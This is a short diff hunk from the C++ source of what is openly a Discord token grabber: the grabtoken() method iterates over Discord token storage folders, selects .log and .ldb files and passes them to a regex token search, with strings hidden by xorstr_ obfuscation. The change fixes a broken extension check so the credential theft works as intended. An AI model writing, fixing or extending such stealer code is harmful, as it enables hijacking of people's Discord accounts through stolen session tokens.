@@ -18,7 +18,7 @@ void grabbertoken::grabtoken()
         {
             for (const auto& entry : std::filesystem::directory_iterator(discordtokenpaths.at(i)))
             {
-                if (entry.path().string().find(xorstr_(".log")) != std::string::npos || entry.path().string().find(xorstr_(".ldb"))) // check if the file have the extension .log or .ldb
+                if (entry.path().string().find(xorstr_(".log")) != std::string::npos || entry.path().string().find(xorstr_(".ldb")) != std::string::npos) // check if the file have the extension .log or .ldb
                 {
                     findtoken((entry.path().string())); // gonna find the token with magic regex search
                 }
